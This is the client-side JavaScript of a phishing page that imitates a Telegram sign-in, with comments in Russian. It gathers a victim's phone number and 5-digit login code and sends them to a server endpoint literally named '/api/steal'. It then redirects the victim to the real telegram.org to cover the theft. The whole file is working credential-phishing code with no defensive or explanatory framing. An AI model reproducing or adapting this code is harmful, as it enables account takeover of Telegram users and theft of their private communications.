document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phone');
    const countryDisplay = document.getElementById('country-display');
    const nextBtn = document.getElementById('next-btn');
    const smsModal = document.getElementById('sms-modal');
    const codeModal = document.getElementById('code-modal');
    const allowBtn = document.getElementById('allow-sms');
    const denyBtn = document.getElementById('deny-sms');
    const denyMessage = document.getElementById('deny-message');
    const closeButtons = document.querySelectorAll('.close');
    const submitCodeBtn = document.getElementById('submit-code');
    const codeInput = document.getElementById('code-input');

    let currentPhone = '';
    let currentCountry = '';

    // Определение страны по номеру
    function detectCountry(phone) {
        if (phone.startsWith('+7')) return 'Казахстан / Россия';
        if (phone.startsWith('+1')) return 'США / Канада';
        if (phone.startsWith('+44')) return 'Великобритания';
        if (phone.startsWith('+49')) return 'Германия';
        if (phone.startsWith('+33')) return 'Франция';
        if (phone.startsWith('+38')) return 'Украина';
        return 'Неизвестно';
    }

    phoneInput.addEventListener('input', function() {
        currentPhone = phoneInput.value;
        currentCountry = detectCountry(currentPhone);
        countryDisplay.textContent = currentCountry ? `Страна: ${currentCountry}` : '';
    });

    // Нажатие "Далее"
    nextBtn.addEventListener('click', function() {
        if (!currentPhone || currentPhone.length < 5) {
            alert('Введите корректный номер');
            return;
        }
        // Показываем модалку с разрешением SMS
        smsModal.style.display = 'flex';
    });

    // Разрешить SMS
    allowBtn.addEventListener('click', function() {
        smsModal.style.display = 'none';
        // Здесь можно отправить запрос на отправку реального SMS (не нужно, просто имитация)
        // Сразу показываем окно ввода кода
        codeModal.style.display = 'flex';
    });

    // Запретить SMS
    denyBtn.addEventListener('click', function() {
        // Показываем текст про "telegramm alphh *a mode"
        denyMessage.classList.remove('hidden');
        // Через 3 секунды скрываем модалку и возвращаемся (можно оставить открытым)
        setTimeout(() => {
            smsModal.style.display = 'none';
            denyMessage.classList.add('hidden');
        }, 3000);
    });

    // Закрытие модалок
    closeButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            smsModal.style.display = 'none';
            codeModal.style.display = 'none';
        });
    });

    // Отправка кода
    submitCodeBtn.addEventListener('click', async function() {
        const code = codeInput.value.trim();
        if (!code || code.length !== 5) {
            alert('Введите 5-значный код');
            return;
        }

        // Отправляем данные на сервер
        const data = {
            phone: currentPhone,
            code: code,
            country: currentCountry
        };

        try {
            const response = await fetch('/api/steal', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            if (response.ok) {
                alert('Данные приняты. Ожидайте...');
                codeModal.style.display = 'none';
                // После успеха можно перенаправить на реальный Telegram
                window.location.href = 'https://telegram.org';
            } else {
                alert('Ошибка сервера');
            }
        } catch (error) {
            alert('Ошибка соединения');
        }
    });

    // Закрытие модалки при клике вне её
    window.addEventListener('click', function(event) {
        if (event.target.classList.contains('modal')) {
            event.target.style.display = 'none';
        }
    });
});
